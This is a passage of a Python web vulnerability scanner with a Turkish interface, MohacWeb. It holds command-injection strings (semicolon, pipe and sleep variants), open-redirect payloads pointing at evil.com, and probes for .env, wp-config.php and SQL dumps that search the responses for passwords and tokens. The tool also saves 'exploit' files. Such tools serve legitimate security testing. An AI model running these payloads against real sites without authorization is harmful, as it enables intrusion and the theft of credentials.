        ]
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            for p in parsed.query.split("&"):
                if "=" in p:
                    k, v = p.split("=", 1)
                    params[k] = v
        if not params:
            params = {"file": "index.html", "page": "home", "path": "/var/www"}

        for param_name in params:
            for payload, indicator, desc in traversal_payloads:
                test_params = dict(params)
                test_params[param_name] = payload
                query = "&".join(k + "=" + quote(v) for k, v in test_params.items())
                test_url = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + query
                resp = safe_request(test_url)
                if resp["error"]:
                    continue
                if indicator in resp["body"]:
                    self.log("Path Traversal bulundu: " + param_name + " (" + desc + ")", "success")
                    vuln = self.brain.explain_path_traversal(test_url, param_name, payload, resp["body"])
                    vuln["parameter"] = param_name
                    vuln["payload"] = payload
                    self.add_vuln(vuln)
                    return True
        self.log("Path Traversal bulunamadi", "info")
        return False

    def scan_cmd_injection(self, url=None):
        url = url or self.target
        self.log("Command Injection taramasi baslatiliyor...", "info")
        cmd_marker = "mohac" + "".join(random.choices(string.digits, k=6))
        cmd_payloads = [
            ("; echo " + cmd_marker, cmd_marker, "Semicolon"),
            ("| echo " + cmd_marker, cmd_marker, "Pipe"),
            ("|| echo " + cmd_marker, cmd_marker, "OR"),
            ("&& echo " + cmd_marker, cmd_marker, "AND"),
            ("test; sleep 5", "SLEEP", "Time-based"),
        ]
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            for p in parsed.query.split("&"):
                if "=" in p:
                    k, v = p.split("=", 1)
                    params[k] = v
        if not params:
            params = {"host": "127.0.0.1", "ip": "127.0.0.1", "ping": "127.0.0.1"}

        for param_name in params:
            for payload, indicator, desc in cmd_payloads:
                test_params = dict(params)
                test_params[param_name] = payload
                query = "&".join(k + "=" + quote(v) for k, v in test_params.items())
                test_url = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + query
                if "SLEEP" in indicator:
                    start = time.time()
                    safe_request(test_url)
                    elapsed = time.time() - start
                    if elapsed >= 4.5:
                        self.log("CMD Injection (Time-based): " + param_name, "success")
                        vuln = self.brain.explain_cmd_injection(test_url, param_name, payload, "")
                        vuln["parameter"] = param_name
                        vuln["payload"] = payload
                        self.add_vuln(vuln)
                        return True
                else:
                    resp = safe_request(test_url)
                    if resp["error"]:
                        continue
                    if indicator in resp["body"]:
                        self.log("CMD Injection bulundu: " + param_name + " (" + desc + ")", "success")
                        vuln = self.brain.explain_cmd_injection(test_url, param_name, payload, resp["body"])
                        vuln["parameter"] = param_name
                        vuln["payload"] = payload
                        self.add_vuln(vuln)
                        return True
        self.log("Command Injection bulunamadi", "info")
        return False

    def scan_open_redirect(self, url=None):
        url = url or self.target
        self.log("Open Redirect taramasi baslatiliyor...", "info")
        redirect_payloads = [
            "https://evil.com", "//evil.com",
            "https://target.com@evil.com", "https://evil.com#.target.com",
        ]
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            for p in parsed.query.split("&"):
                if "=" in p:
                    k, v = p.split("=", 1)
                    params[k] = v
        redirect_params = ["url", "redirect", "next", "return", "goto", "dest", "continue", "return_url"]
        for param_name in list(params.keys()) + redirect_params:
            for payload in redirect_payloads:
                test_params = dict(params) if params else {}
                test_params[param_name] = payload
                query = "&".join(k + "=" + quote(v) for k, v in test_params.items())
                test_url = parsed.scheme + "://" + parsed.netloc + parsed.path + "?" + query
                resp = safe_request(test_url)
                if resp["error"]:
                    continue
                location = resp["headers"].get("Location", resp["headers"].get("location", ""))
                if "evil.com" in location:
                    self.log("Open Redirect bulundu: " + param_name, "success")
                    vuln = self.brain.explain_open_redirect(test_url, param_name, payload, resp["body"])
                    vuln["parameter"] = param_name
                    vuln["payload"] = payload
                    self.add_vuln(vuln)
                    return True
        self.log("Open Redirect bulunamadi", "info")
        return False

    def scan_ssl(self):
        self.log("SSL/TLS taramasi baslatiliyor...", "info")
        hostname = self.domain.split(":")[0]
        port = 443
        if ":" in self.domain:
            port = int(self.domain.split(":")[1])
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    version = ssock.version()
                    self.log("SSL Versiyon: " + version, "info")
                    if version in ("TLSv1", "TLSv1.1", "SSLv3", "SSLv2"):
                        self.add_vuln({
                            "type": "SSL/TLS: Zayif Protokol",
                            "severity": "High",
                            "cvss_score": 7.4,
                            "cwe_id": "CWE-326",
                            "owasp_category": "A02:2021 - Cryptographic Failures",
                            "description": "Sunucu zayif SSL/TLS protokolu destekliyor: " + version,
                            "step_by_step": [
                                "[ADIM 1] SSL baglantisi kuruldu: " + hostname + ":" + str(port),
                                "[ADIM 2] Protokol: " + version,
                                "[ADIM 3] POODLE, BEAST, DROWN saldirilari mumkun",
                                "[ADIM 4] Oneri: TLS 1.2+ kullanin"
                            ],
                            "exploit_code": "# nmap --script ssl-enum-ciphers -p 443 " + hostname
                        })
        except Exception as e:
            self.log("SSL baglanti hatasi: " + str(e)[:80], "error")

    def scan_sensitive_files(self):
        self.log("Hassas dosya taramasi baslatiliyor...", "info")
        paths = [
            "/.env", "/.git/config", "/.htaccess", "/robots.txt",
            "/wp-config.php", "/config.php", "/configuration.php",
            "/admin/", "/phpmyadmin/", "/server-status",
            "/backup.sql", "/dump.sql", "/.svn/entries",
        ]
        found = []
        for path in paths:
            url = self.target + path
            resp = safe_request(url)
            if resp["status"] == 200 and len(resp["body"]) > 50:
                self.log("Hassas dosya: " + path + " (HTTP 200)", "warn")
                found.append(path)
                if path in ("/.env", "/config.php", "/wp-config.php"):
                    keywords = ["password", "secret", "key", "token", "DB_HOST", "DB_PASS"]
                    for kw in keywords:
                        if kw.lower() in resp["body"].lower():
                            self.add_vuln(self.brain.explain_info_disclosure(url, "sensitive_file", path + " dosyasinda " + kw + " bulundu", resp["body"][:200]))
                            break
        if found:
            self.log(str(len(found)) + " hassas dosya bulundu", "success")
        else:
            self.log("Hassas dosya bulunamadi", "info")

    def quick_scan(self):
        self.log("Hedef: " + self.target, "info")
        recon = self.reconnaissance()
        forms = recon.get("forms", [])
        self.scan_sqli(forms=forms)
        self.scan_xss(forms=forms)
        self.scan_sensitive_files()
        self.scan_ssl()
        return self.vulns

    def full_scan(self):
        self.log("Hedef: " + self.target, "info")
        recon = self.reconnaissance()
        forms = recon.get("forms", [])
        self.scan_sqli(forms=forms)
        self.scan_xss(forms=forms)
        self.scan_path_traversal()
        self.scan_cmd_injection()
        self.scan_open_redirect()
        self.scan_ssl()
        self.scan_sensitive_files()
        return self.vulns


# ============================================
# RAPOR URETICI
# ============================================
class ReportGenerator:
    @staticmethod
    def print_vuln_details(vuln):
        severity_colors = {
            "Critical": C.R, "High": C.Y, "Medium": C.M, "Low": C.Cy, "Info": C.Dim
        }
        color = severity_colors.get(vuln.get("severity", ""), C.W)
        print()
        print("  " + C.Bld + "=" * 60 + C.RST)
        print("  " + color + C.Bld + "[!] " + vuln.get("type", "Unknown") + C.RST)
        print("  " + C.Bld + "=" * 60 + C.RST)
        print()
        print("  " + C.Bld + "Severity:    " + C.RST + " " + color + vuln.get("severity", "N/A") + C.RST)
        print("  " + C.Bld + "CVSS Score:  " + C.RST + " " + str(vuln.get("cvss_score", "N/A")))
        print("  " + C.Bld + "CWE:         " + C.RST + " " + vuln.get("cwe_id", "N/A"))
        print("  " + C.Bld + "OWASP:       " + C.RST + " " + vuln.get("owasp_category", "N/A"))
        print("  " + C.Bld + "URL:         " + C.RST + " " + vuln.get("url", "N/A"))
        print("  " + C.Bld + "Parameter:   " + C.RST + " " + vuln.get("parameter", "N/A"))
        print("  " + C.Bld + "Payload:     " + C.RST + " " + vuln.get("payload", "N/A"))
        print()
        print("  " + C.Bld + "[ ACIKLAMA ]" + C.RST)
        print("  " + vuln.get("description", ""))
        print()

        steps = vuln.get("step_by_step", [])
        if steps:
            print("  " + C.Cy + C.Bld + "[ ADIM ADIM ACIKLAMA ]" + C.RST)
            print()
            for step in steps:
                print("  " + C.Cy + step + C.RST)
            print()

        exploit = vuln.get("exploit_code", "")
        if exploit and exploit.strip() and not exploit.startswith("# Bilgi"):
            print("  " + C.R + C.Bld + "[ EXPLOIT KODU ]" + C.RST)
            print("  " + C.Dim + "(Kaydetmek icin secimde 'e' tuslayin)" + C.RST)
            print()
            lines = exploit.split("\n")
            for line in lines[:40]:
                print("  " + C.G + line + C.RST)
            if len(lines) > 40:
                print("  " + C.Dim + "  ... (" + str(len(lines)) + " satir toplam)" + C.RST)
            print()

    @staticmethod
    def generate_html_report(vulns, target, filename="mohacweb_report.html"):
        severity_colors = {
            "Critical": "#dc3545", "High": "#fd7e14", "Medium": "#ffc107",
            "Low": "#17a2b8", "Info": "#6c757d"
        }

        counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
        for v in vulns:
            sev = v.get("severity", "Info")
            counts[sev] = counts.get(sev, 0) + 1

        html = '<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8">'
        html += '<title>MohacWeb v1.0 - Guvenlik Raporu</title>'
        html += '<style>'
        html += '*{margin:0;padding:0;box-sizing:border-box}'
        html += 'body{font-family:Segoe UI,sans-serif;background:#0a0a0a;color:#e0e0e0;line-height:1.6}'
        html += '.container{max-width:1200px;margin:0 auto;padding:20px}'
        html += '.header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:40px;border-radius:10px;margin-bottom:30px;border:1px solid #0f3460}'
        html += '.header h1{color:#00d4ff;font-size:2em;margin-bottom:10px}'
        html += '.summary{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:30px}'
        html += '.card{background:#1a1a2e;padding:20px;border-radius:10px;text-align:center;border:1px solid #333}'
        html += '.card .count{font-size:2.5em;font-weight:bold}'
        html += '.card .label{color:#888;font-size:.9em}'
        html += '.vuln{background:#1a1a2e;border-radius:10px;margin-bottom:20px;overflow:hidden;border:1px solid #333}'
        html += '.vuln-h{padding:20px;cursor:pointer;display:flex;justify-content:space-between;align-items:center}'
        html += '.vuln-h:hover{background:#222}'
        html += '.badge{padding:5px 15px;border-radius:20px;color:#fff;font-weight:bold}'
        html += '.vuln-b{padding:20px;border-top:1px solid #333;display:none}'
        html += '.vuln-b.show{display:block}'
        html += '.info-g{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin-bottom:20px}'
        html += '.info-i{background:#0d0d1a;padding:10px;border-radius:5px}'
        html += '.info-i .lbl{color:#888;font-size:.85em}'
        html += '.info-i .val{color:#00d4ff;font-weight:bold}'
        html += '.steps{background:#0d0d1a;padding:20px;border-radius:5px;margin-bottom:20px}'
        html += '.steps h3{color:#00d4ff;margin-bottom:10px}'
        html += '.step{padding:8px 0;border-bottom:1px solid #222}'
        html += '.exploit{background:#0d0d1a;padding:20px;border-radius:5px}'
        html += '.exploit h3{color:#dc3545;margin-bottom:10px}'
        html += '.exploit pre{background:#000;padding:15px;border-radius:5px;overflow-x:auto;color:#00ff00;font-family:Courier New,monospace;font-size:.85em;max-height:500px;overflow-y:auto}'
        html += '</style></head><body><div class="container">'
        html += '<div class="header"><h1>MohacWeb v1.0 - Guvenlik Raporu</h1>'
        html += '<p>Hedef: <strong>' + target + '</strong></p>'
        html += '<p>Tarih: ' + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + '</p>'
        html += '<p>Toplam Acik: ' + str(len(vulns)) + '</p></div>'

        html += '<div class="summary">'
        for sev, count in counts.items():
            color = severity_colors.get(sev, "#6c757d")
            html += '<div class="card"><div class="count" style="color:' + color + '">' + str(count) + '</div><div class="label">' + sev + '</div></div>'
        html += '</div>'

        for i, v in enumerate(vulns):
            sev = v.get("severity", "Info")
            color = severity_colors.get(sev, "#6c757d")
            steps_html = ""
            for step in v.get("step_by_step", []):
                steps_html += '<div class="step">' + step + '</div>'
            exploit_html = ""
            exploit_code = v.get("exploit_code", "")
            if exploit_code and not exploit_code.startswith("# Bilgi"):
                safe_code = exploit_code.replace("<", "&lt;").replace(">", "&gt;")
                exploit_html = '<div class="exploit"><h3>Exploit Kodu</h3><pre>' + safe_code + '</pre></div>'

            html += '<div class="vuln">'
            html += '<div class="vuln-h" onclick="this.nextElementSibling.classList.toggle(\'show\')">'
            html += '<span class="vuln-type">' + v.get("type", "Unknown") + '</span>'
            html += '<span class="badge" style="background:' + color + '">' + sev + '</span></div>'
            html += '<div class="vuln-b">'
            html += '<div class="info-g">'
            html += '<div class="info-i"><div class="lbl">CVSS</div><div class="val">' + str(v.get("cvss_score", "N/A")) + '</div></div>'
            html += '<div class="info-i"><div class="lbl">CWE</div><div class="val">' + v.get("cwe_id", "N/A") + '</div></div>'
            html += '<div class="info-i"><div class="lbl">OWASP</div><div class="val">' + v.get("owasp_category", "N/A") + '</div></div>'
            html += '<div class="info-i"><div class="lbl">Parameter</div><div class="val">' + v.get("parameter", "N/A") + '</div></div>'
            html += '</div>'
            html += '<p><strong>Aciklama:</strong> ' + v.get("description", "") + '</p>'
            html += '<p><strong>URL:</strong> ' + v.get("url", "") + '</p>'
            html += '<p><strong>Payload:</strong> <code>' + v.get("payload", "") + '</code></p>'
            html += '<div class="steps"><h3>Adim Adim Aciklama</h3>' + steps_html + '</div>'
            html += exploit_html + '</div></div>'

        html += '</div></body></html>'

        with open(filename, "w", encoding="utf-8") as f:
            f.write(html)
        return filename


# ============================================
# ANA MENU
# ============================================
class MohacWeb:
    def __init__(self):
        self.db = Database()
        self.report = ReportGenerator()
        self.current_target = ""

    def menu(self):
        print("""
  """ + C.Cy + C.Bld + """+------------------------------------------+
  |           ANA MENU                       |
  +------------------------------------------+
  |  [1]  Hizli Tarama                       |
  |  [2]  Full Tarama                         |
  |  [3]  SQL Injection Taramasi              |
  |  [4]  XSS Taramasi                        |
  |  [5]  Path Traversal Taramasi             |
  |  [6]  Command Injection Taramasi          |
  |  [7]  Open Redirect Taramasi              |
  |  [8]  SSL/TLS Kontrolu                    |
  |  [9]  Hassas Dosya Taramasi               |
  |  [10] Tarama Gecmisi                      |
  |  [11] Tarama Detayi                       |
  |  [12] HTML Rapor Olustur                  |
  |  [0]  Cikis                               |
  +------------------------------------------+""" + C.RST)
        print()

    def get_target(self):
        target = input("  " + C.Y + "[?] Hedef URL: " + C.RST).strip()
        if not target.startswith("http"):
            target = "http://" + target
        return target

    def run_scan(self, scan_func, scan_type):
        target = self.get_target()
        print()
        self.current_target = target
        scanner = Scanner(target, self.db)
        start_time = time.time()
        vulns = scan_func(scanner)
        elapsed = time.time() - start_time

        print()
        print("  " + C.Bld + "=" * 50 + C.RST)
        print("  " + C.Bld + "TARAMA SONUCLARI" + C.RST)
        print("  " + C.Bld + "=" * 50 + C.RST)

        if not vulns:
            print("  " + C.G + "[+] Acik bulunamadi!" + C.RST)
        else:
            print("  " + C.R + "[!] " + str(len(vulns)) + " acik bulundu!" + C.RST)
            print()
            for vuln in vulns:
                self.report.print_vuln_details(vuln)

        results = {"vulnerabilities": vulns}
        scan_id = self.db.save_scan(target, scan_type, results, elapsed)
        print()
        print("  " + C.Dim + "[*] Tarama suresi: " + str(round(elapsed, 1)) + "s | Scan ID: " + str(scan_id) + C.RST)

        if vulns:
            save = input("  " + C.Y + "[?] Exploitleri dosyaya kaydet? (e/h): " + C.RST).strip().lower()
            if save == "e":
                for i, vuln in enumerate(vulns):
                    exploit = vuln.get("exploit_code", "")
                    if exploit and not exploit.startswith("# Bilgi"):
                        safe_type = vuln["type"].replace("/", "_").replace(" ", "_").replace("(", "").replace(")", "")
                        filename = "exploit_" + safe_type + "_" + str(i + 1) + ".py"
                        with open(filename, "w") as f:
                            f.write(exploit)
                        print("  " + C.G + "[+] Kaydedildi: " + filename + C.RST)

            html_save = input("  " + C.Y + "[?] HTML rapor olustur? (e/h): " + C.RST).strip().lower()
            if html_save == "e":
                report_file = self.report.generate_html_report(vulns, target)
                print("  " + C.G + "[+] Rapor: " + report_file + C.RST)

    def show_history(self):
        rows = self.db.get_history()
        if not rows:
            print("  " + C.Dim + "[*] Tarama gecmisi bos" + C.RST)
            return
        print()
        print("  " + C.Bld + "TARAMA GECMISI" + C.RST)
        print("  " + "-" * 90)
        print("  " + C.Bld + "{:<5} {:<30} {:<12} {:<6} {:<4} {:<4} {:<4} {:<4}".format("ID", "Hedef", "Tur", "Acik", "C", "H", "M", "L") + C.RST)
        print("  " + "-" * 90)
        for row in rows:
            scan_id, target, scan_type, vulns, c, h, m, l, scan_time, ts = row
            print("  {:<5} {:<30} {:<12} {:<6} {:<4} {:<4} {:<4} {:<4}".format(
                scan_id, target[:29], scan_type[:11], vulns, c, h, m, l))

    def show_detail(self):
        try:
            scan_id = int(input("  " + C.Y + "[?] Scan ID: " + C.RST))
        except ValueError:
            return
        scan, vulns = self.db.get_scan_details(scan_id)
        if not scan:
            print("  " + C.R + "[-] Scan bulunamadi" + C.RST)
            return
        print()
        print("  " + C.Bld + "SCAN #" + str(scan_id) + " DETAYLARI" + C.RST)
        print("  Hedef: " + str(scan[1]))
        print("  Tur: " + str(scan[2]))
        print("  Toplam Acik: " + str(scan[3]))
        print("  Sure: " + str(round(scan[8], 1)) + "s")

        for v in vulns:
            vuln_data = {
                "type": v[2], "severity": v[3], "url": v[4],
                "parameter": v[5], "payload": v[6], "description": v[7],
                "step_by_step": json.loads(v[8]) if v[8] else [],
                "exploit_code": v[9], "cvss_score": v[10],
                "cwe_id": v[11], "owasp_category": v[12]
            }
            self.report.print_vuln_details(vuln_data)

    def run(self):
        banner()
        while True:
            self.menu()
            choice = input("  " + C.Y + "[?] Secim: " + C.RST).strip()

            if choice == "1":
                self.run_scan(lambda s: s.quick_scan(), "Quick Scan")
            elif choice == "2":
                self.run_scan(lambda s: s.full_scan(), "Full Scan")
            elif choice == "3":
                self.run_scan(lambda s: s.scan_sqli() or [], "SQL Injection")
            elif choice == "4":
                self.run_scan(lambda s: s.scan_xss() or [], "XSS")
            elif choice == "5":
                self.run_scan(lambda s: s.scan_path_traversal() or [], "Path Traversal")
            elif choice == "6":
                self.run_scan(lambda s: s.scan_cmd_injection() or [], "Command Injection")
            elif choice == "7":
                self.run_scan(lambda s: s.scan_open_redirect() or [], "Open Redirect")
            elif choice == "8":
                target = self.get_target()
                scanner = Scanner(target, self.db)
                scanner.scan_ssl()
            elif choice == "9":
                target = self.get_target()
                scanner = Scanner(target, self.db)
                scanner.scan_sensitive_files()
            elif choice == "10":
                self.show_history()
            elif choice == "11":
                self.show_detail()
            elif choice == "12":
                target = self.get_target()
                vulns = []
                rows = self.db.get_history(1)
                if rows:
                    _, v_list = self.db.get_scan_details(rows[0][0])
                    for v in v_list:
                        vulns.append({
                            "type": v[2], "severity": v[3], "url": v[4],
                            "parameter": v[5], "payload": v[6], "description": v[7],
                            "step_by_step": json.loads(v[8]) if v[8] else [],
                            "exploit_code": v[9], "cvss_score": v[10],
                            "cwe_id": v[11], "owasp_category": v[12]
                        })
                report_file = self.report.generate_html_report(vulns, target)
                print("  " + C.G + "[+] Rapor: " + report_file + C.RST)
            elif choice == "0":
                print("  " + C.Cy + "Gule gule!" + C.RST)
                print()
                break
            else:
                print("  " + C.R + "[-] Gecersiz secim" + C.RST)

            input("  " + C.Dim + "Devam etmek icin Enter..." + C.RST)


if __name__ == "__main__":
    app = MohacWeb()
    app.run()
